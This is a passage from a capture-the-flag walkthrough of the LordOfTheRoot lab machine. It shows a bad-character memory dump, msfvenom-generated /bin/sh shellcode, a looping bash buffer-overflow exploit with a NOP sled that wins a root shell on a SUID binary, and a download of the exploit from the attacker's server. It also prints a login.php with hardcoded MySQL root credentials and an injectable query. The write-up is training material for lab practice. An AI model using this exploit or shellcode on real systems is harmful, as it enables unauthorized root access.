    <div>0xffffceb0:Â Â Â Â Â 0x27262524Â Â Â Â Â Â 0x2b2a2928Â Â Â Â Â Â 0x2f2e2d2cÂ Â Â Â Â Â 0x33323130</div>
    <div>0xffffcec0:Â Â Â Â Â 0x37363534Â Â Â Â Â Â 0x3b3a3938Â Â Â Â Â Â 0x3f3e3d3cÂ Â Â Â Â Â 0x43424140</div>
    <div>0xffffced0:Â Â Â Â Â 0x47464544Â Â Â Â Â Â 0x4b4a4948Â Â Â Â Â Â 0x4f4e4d4cÂ Â Â Â Â Â 0x53525150</div>
    <div>0xffffcee0:Â Â Â Â Â 0x57565554Â Â Â Â Â Â 0x5b5a5958Â Â Â Â Â Â 0x5f5e5d5cÂ Â Â Â Â Â 0x63626160</div>
    <div>0xffffcef0:Â Â Â Â Â 0x67666564Â Â Â Â Â Â 0x6b6a6968Â Â Â Â Â Â 0x6f6e6d6cÂ Â Â Â Â Â 0x73727170</div>
    <div>0xffffcf00:Â Â Â Â Â 0x77767574Â Â Â Â Â Â 0x7b7a7978Â Â Â Â Â Â 0x7f7e7d7cÂ Â Â Â Â Â 0x83828180</div>
    <div>0xffffcf10:Â Â Â Â Â 0x87868584Â Â Â Â Â Â 0x8b8a8988Â Â Â Â Â Â 0x8f8e8d8cÂ Â Â Â Â Â 0x93929190</div>
    <div>0xffffcf20:Â Â Â Â Â 0x97969594Â Â Â Â Â Â 0x9b9a9998Â Â Â Â Â Â 0x9f9e9d9cÂ Â Â Â Â Â 0xa3a2a1a0</div>
    <div>0xffffcf30:Â Â Â Â Â 0xa7a6a5a4Â Â Â Â Â Â 0xabaaa9a8Â Â Â Â Â Â 0xafaeadacÂ Â Â Â Â Â 0xb3b2b1b0</div>
    <div>0xffffcf40:Â Â Â Â Â 0xb7b6b5b4Â Â Â Â Â Â 0xbbbab9b8Â Â Â Â Â Â 0xbfbebdbcÂ Â Â Â Â Â 0xc3c2c1c0</div>
    <div>0xffffcf50:Â Â Â Â Â 0xc7c6c5c4Â Â Â Â Â Â 0xcbcac9c8Â Â Â Â Â Â 0xcfcecdccÂ Â Â Â Â Â 0xd3d2d1d0</div>
    <div>0xffffcf60:Â Â Â Â Â 0xd7d6d5d4Â Â Â Â Â Â 0xdbdad9d8Â Â Â Â Â Â 0xdfdedddcÂ Â Â Â Â Â 0xe3e2e1e0</div>
    <div>0xffffcf70:Â Â Â Â Â 0xe7e6e5e4Â Â Â Â Â Â 0xebeae9e8Â Â Â Â Â Â 0xefeeedecÂ Â Â Â Â Â 0xf3f2f1f0</div>
    <div>0xffffcf80:Â Â Â Â Â 0xf7f6f5f4Â Â Â Â Â Â 0xfbfaf9f8Â Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">0xfffefdfc</font>Â Â Â Â Â Â 0xffffdf00</div>
    <div>0xffffcf90:Â Â Â Â Â 0xffffdf6bÂ Â Â Â Â Â 0xffffdf9eÂ Â Â Â Â Â 0xffffdfb2Â Â Â Â Â Â 0xffffdfc5</div>
    <div>0xffffcfa0:Â Â Â Â Â 0x00000000Â Â Â Â Â Â 0x00000020Â Â Â Â Â Â 0xf7fd3070Â Â Â Â Â Â 0x00000021</div>
    <div>0xffffcfb0:Â Â Â Â Â 0xf7fd2000Â Â Â Â Â Â 0x00000010Â Â Â Â Â Â 0x0f8bfbffÂ Â Â Â Â Â 0x00000006</div>
    <div>0xffffcfc0:Â Â Â Â Â 0x00001000Â Â Â Â Â Â 0x00000011Â Â Â Â Â Â 0x00000064Â Â Â Â Â Â 0x00000003</div>
    <div>0xffffcfd0:Â Â Â Â Â 0x08048034Â Â Â Â Â Â 0x00000004Â Â Â Â Â Â 0x00000020Â Â Â Â Â Â 0x00000005</div>
    <div>0xffffcfe0:Â Â Â Â Â 0x00000008Â Â Â Â Â Â 0x00000007Â Â Â Â Â Â 0xf7fd4000Â Â Â Â Â Â 0x00000008</div>
    <div>0xffffcff0:Â Â Â Â Â 0x00000000Â Â Â Â Â Â 0x00000009Â Â Â Â Â Â 0x08048360Â Â Â Â Â Â 0x0000000b</div>
    <div>0xffffd000:Â Â Â Â Â 0x00000000Â Â Â Â Â Â 0x0000000cÂ Â Â Â Â Â 0x00000000Â Â Â Â Â Â 0x0000000d</div>
    <div>0xffffd010:Â Â Â Â Â 0x00000000Â Â Â Â Â Â 0x0000000eÂ Â Â Â Â Â 0x00000000Â Â Â Â Â Â 0x00000017</div>
</div>
<div><br /></div>
<div>Great! We were able to pass all the rest of the characters (I've highlighted the start and end in green). Let's go ahead and generate our shell code using msfvenom (excluding the bad characters we detected).</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/lordoftheroot# msfvenom -a x86 -p linux/x86/exec CMD=/bin/sh -b '\x00\x09\x0a\x20' -e x86/shikata_ga_nai -f c</div>
    <div>[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload</div>
    <div>Found 1 compatible encoders</div>
    <div>Attempting to encode payload with 1 iterations of x86/shikata_ga_nai</div>
    <div>x86/shikata_ga_nai succeeded with size 70 (iteration=0)</div>
    <div>x86/shikata_ga_nai chosen with final size 70</div>
    <div>Payload size: 70 bytes</div>
    <div>Final size of c file: 319 bytes</div>
    <div>unsigned char buf[] = </div>
    <div>"\xbe\x41\x30\xa2\x6f\xd9\xc0\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1"</div>
    <div>"\x0b\x83\xea\xfc\x31\x72\x11\x03\x72\x11\xe2\xb4\x5a\xa9\x37"</div>
    <div>"\xaf\xc9\xcb\xaf\xe2\x8e\x9a\xd7\x94\x7f\xee\x7f\x64\xe8\x3f"</div>
    <div>"\xe2\x0d\x86\xb6\x01\x9f\xbe\xc1\xc5\x1f\x3f\xfd\xa7\x76\x51"</div>
    <div>"\x2e\x5b\xe0\xad\x67\xc8\x79\x4c\x4a\x6e";</div>
</div>
<div><br /></div>
<div>Finally, we need to see if we have a call or jmp to esp (since we can't control eax). This will allow us to more predictably control the flow of our exploit.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/lordoftheroot# objdump -D door | grep -P 'jmp|call' | grep esp</div>
</div>
<div><br /></div>
<div>Nothing! Looks like we will have to write a large chunk of NOPs (no operation) to the stack, then randomly jump into the stack and slide down to our exploit code. Not the cleanest way to do things, but thankfully this isn't a "one shot at it" program. We can run it over and over until it works.</div>
<div><br /></div>
<div>We'll run the vulnerable program a few times on the victim to get an idea of a good address to set eip to. We'll also try to disable ASLR (using ulimit) to get more predictable address space.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>smeagol@LordOfTheRoot:~$ ulimit -s unlimited</div>
</div>
<div><br /></div>
<div>We'll use the following bash script to send our exploit code until we get a shell.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/lordoftheroot# cat exploit.sh </div>
    <div>#!/bin/bash</div>
    <div>while true; do</div>
    <div>Â Â $(find /SECRET -type f -size 5150c) $(python -c 'print "A"*171 + "\x50\x85\xc9\xbf" + "\x90"*20480 + "\xbe\x41\x30\xa2\x6f\xd9\xc0\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1\x0b\x83\xea\xfc\x31\x72\x11\x03\x72\x11\xe2\xb4\x5a\xa9\x37\xaf\xc9\xcb\xaf\xe2\x8e\x9a\xd7\x94\x7f\xee\x7f\x64\xe8\x3f\xe2\x0d\x86\xb6\x01\x9f\xbe\xc1\xc5\x1f\x3f\xfd\xa7\x76\x51\x2e\x5b\xe0\xad\x67\xc8\x79\x4c\x4a\x6e"') 2&gt; /dev/null</div>
    <div>Â Â sleep 1</div>
    <div>done</div>
</div>
<div><br /></div>
<div>I transferred the exploit to the victim (using python's SimpleHTTPServer) and kicked it off.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>smeagol@LordOfTheRoot:~$ wget -O exploit.sh 10.183.0.222:4321/exploit.sh</div>
    <div>Connecting to 10.183.0.222:4321... connected.</div>
    <div>HTTP request sent, awaiting response... 200 OK</div>
    <div>Length: 443 [text/x-sh]</div>
    <div>Saving to: 'exploit.sh'</div>
    <div>
        <div><br /></div>
    </div>
    <div>100%[============================================================================================================&gt;] 443Â Â Â Â Â Â Â Â Â --.-K/sÂ Â Â in 0s</div>
    <div>
        <div><br /></div>
    </div>
    <div>2019-05-09 09:46:12 (74.1 MB/s) - 'exploit.sh' saved [443/443]</div>
    <div>
        <div><br /></div>
    </div>
    <div>smeagol@LordOfTheRoot:~$ chmod +x exploit.sh</div>
    <div>smeagol@LordOfTheRoot:~$ ./exploit.sh</div>
    <div>[...]</div>
    <div>id<br /></div>
    <div>uid=1000(smeagol) gid=1000(smeagol) euid=0(root) groups=0(root),1000(smeagol)</div>
</div>
<div><br /></div>
<div>Once the seg fault errors stopped scrolling by, we knew we had a shell.</div>
<div><br /></div>
<div>Time to get that flag from /root.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>cd /root</div>
    <div>cat Flag.txt<br /></div>
    <div>"There is only one Lord of the Ring, only one who can bend it to his will. And he does not share power."</div>
    <div>â€“ Gandalf</div>
</div>
<div><br /></div>
<div><br /></div>
<div>
    <h2>Pivoting</h2>
</div>
<div>N/A</div>
<div><br /></div>
<div><br /></div>
<div>
    <h2>Clean Up</h2>
</div>
<div><br /></div>
<div>*** REMOVE /home/smeagol/exploit.sh ***</div>
<div><br /></div>
<div><br /></div>
<div>
    <h2>Additional Info</h2>
</div>
<div><br /></div>
<div><b>MySQL credentials</b></div>
<div><br /></div>
<div>We are able to see the mysql credentials for 'root' in the login.php page.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>smeagol@LordOfTheRoot:/var/www/978345210$ cat login.php</div>
    <div>&lt;?php</div>
    <div>session_start(); // Starting Session</div>
    <div>$error=''; // Variable To Store Error Message</div>
    <div>if (isset($_POST['submit'])) {</div>
    <div>Â Â Â Â Â Â Â Â if (empty($_POST['username']) || empty($_POST['password'])) {</div>
    <div>Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â $error = "Username or Password is invalid";</div>
    <div>Â Â Â Â Â Â Â Â }</div>
    <div>Â Â Â Â Â Â Â Â else</div>
    <div>Â Â Â Â Â Â Â Â {</div>
    <div>Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â // Define $username and $password</div>
    <div>Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â $username=$_POST['username'];</div>
    <div>Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â $password=$_POST['password'];</div>
    <div>Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">$db = new mysqli('localhost', 'root', 'darkshadow', 'Webapp');</span></div>
    <div><br /></div>
    <div>Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â // To protect MySQL injection for Security purpose</div>
    <div>Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â $username = stripslashes($username);</div>
    <div>Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â $password = stripslashes($password);</div>
    <div><br /></div>
    <div>Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â $sql="select username, password from Users where username='".$username."' AND password='".$password."';";</div>
    <div>Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â //echo $sql;</div>
    <div>Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â $query = $db-&gt;query($sql);</div>
    <div>Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â $rows = $query-&gt;num_rows;</div>
    <div><br /></div>
    <div>Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â if ($rows == 1) {</div>
    <div>Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â $_SESSION['login_user']=$username; // Initializing Session</div>
    <div>Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â header("location: profile.php"); // Redirecting To Other Page</div>
    <div>Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â } else {</div>
    <div>Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â $error = "Username or Password is invalid";</div>
    <div>Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â }</div>
    <div>Â Â Â Â Â Â Â Â }</div>
    <div>}</div>
    <div>?&gt;</div>
</div>
<div><br /></div>
<div>I tried the root password for the system root account, but it didn't work.</div>
<div><br /></div>
<div><br /></div>
<div><b>switcher.py</b></div>
<div><br /></div>
<div>Here is the script that was playing the shell game with the vulnerable version of 'file'.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@LordOfTheRoot:~# cat switcher.py </div>
    <div>#!/usr/bin/python</div>
    <div>import os</div>
    <div>from random import randint</div>
    <div>
        <div><br /></div>
    </div>
    <div>targets= ["/SECRET/door1/","/SECRET/door2/","/SECRET/door3/"]</div>
    <div>for t in targets:</div>
    <div>Â Â Â os.system("rm "+t+"*")</div>
    <div>Â Â Â os.system("cp -p other "+t)</div>
    <div>Â Â Â os.system("cp -p "+t+"other "+t+"file")</div>
    <div>Â Â Â os.system("rm "+t+"other")</div>
    <div>
        <div><br /></div>
    </div>
    <div>luckyDoor = randint(0,2)</div>
    <div>t=targets[luckyDoor]</div>
    <div>os.system("rm "+t+"*")</div>
    <div>os.system("cp -p buf "+t)</div>
    <div>os.system("cp -p "+t+"buf "+t+"file")</div>
    <div>os.system("rm "+t+"buf")</div>
</div>
<div><br /></div>
<div>It was set up to run every 3 minutes in root's crontab.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@LordOfTheRoot:~# crontab -l</div>
    <div># Edit this file to introduce tasks to be run by cron.</div>
    <div>#</div>
    <div># Each task to run has to be defined through a single line</div>
    <div># indicating with different fields when the task will be run</div>
    <div># and what command to run for the task</div>
    <div># </div>
    <div># To define the time you can provide concrete values for</div>
    <div># minute (m), hour (h), day of month (dom), month (mon),</div>
    <div># and day of week (dow) or use '*' in these fields (for 'any').# </div>
    <div># Notice that tasks will be started based on the cron's system</div>
    <div># daemon's notion of time and timezones.</div>
    <div># </div>
    <div># Output of the crontab jobs (including errors) is sent through</div>
    <div># email to the user the crontab file belongs to (unless redirected).</div>
    <div># </div>
    <div># For example, you can run a backup of all your user accounts</div>
    <div># at 5 a.m every week with:</div>
    <div># 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/</div>
    <div># </div>
    <div># For more information see the manual pages of crontab(5) and cron(8)</div>
    <div># </div>
    <div># m hÂ Â dom mon dowÂ Â Â command</div>
    <div>*/3 * * * * /root/switcher.py</div>
</div>
<div><br /></div>
<div><br /></div>
<div><b>smeagol's Home Directory</b></div>
<div><br /></div>
<div>Digging into the user's home directory, we have a .bash_history file with some interesting commands. Unfortunately, we can't <span style="font-style: italic;">actually</span> run any of the commands.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>smeagol@LordOfTheRoot:~$ cat .bash_history</div>
    <div>su -</div>
    <div>sudo /etc/passwod</div>
    <div>visudo</div>
    <div>smeagol@LordOfTheRoot:~$ sudo -l</div>
    <div>[sudo] password for smeagol: </div>
    <div>Sorry, user smeagol may not run sudo on LordOfTheRoot.</div>
</div>
<div><br /></div>
<div>We also have a Firefox profile with some potentially good stuff...</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>smeagol@LordOfTheRoot:~/.mozilla/firefox/jbyf45od.default$ ls</div>
    <div>addons.jsonÂ Â Â Â Â Â Â Â Â Â Â cookies.sqlite-shmÂ Â gmpÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â mimeTypes.rdfÂ Â Â Â Â Â Â prefs.jsÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â times.json</div>
    <div>blocklist.xmlÂ Â Â Â Â Â Â Â Â cookies.sqlite-walÂ Â gmp-gmpopenh264Â Â Â Â Â Â Â Â Â Â minidumpsÂ Â Â Â Â Â Â Â Â Â Â revocations.txtÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â webapps</div>
    <div>bookmarkbackupsÂ Â Â Â Â Â Â crashesÂ Â Â Â Â Â Â Â Â Â Â Â Â healthreportÂ Â Â Â Â Â Â Â Â Â Â Â Â permissions.sqliteÂ Â search.jsonÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â webappsstore.sqlite</div>
    <div>cert8.dbÂ Â Â Â Â Â Â Â Â Â Â Â Â Â datareportingÂ Â Â Â Â Â Â healthreport.sqliteÂ Â Â Â Â Â places.sqliteÂ Â Â Â Â Â Â secmod.dbÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â webappsstore.sqlite-shm</div>
    <div>compatibility.iniÂ Â Â Â Â extensions.iniÂ Â Â Â Â Â healthreport.sqlite-shmÂ Â places.sqlite-shmÂ Â Â sessionCheckpoints.jsonÂ Â Â Â Â Â Â webappsstore.sqlite-wal</div>
    <div>content-prefs.sqliteÂ Â extensions.jsonÂ Â Â Â Â healthreport.sqlite-walÂ Â places.sqlite-walÂ Â Â sessionstore-backupsÂ Â Â Â Â Â Â Â Â Â xulstore.json</div>
    <div>cookies.sqliteÂ Â Â Â Â Â Â Â formhistory.sqliteÂ Â <span style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">key3.db</span>Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â pluginreg.datÂ Â Â Â Â Â Â SiteSecurityServiceState.txt</div>
</div>
<div><br /></div>
<div>There isn't a logins.json or signons.sqlite file, though... so we'll keep digging around.</div>
<div><br /></div>
<div>We found the users Gnome Keyring...</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>smeagol@LordOfTheRoot:~/.local/share/keyrings$ ls</div>
    <div>login.keyringÂ Â user.keystoreÂ Â user.keystore.N5T84X</div>
</div>
<div></div>
<div><br /></div>
<div>...but it doesn't seem to have much in it.</div>
<div><br /></div>
<div><br /></div>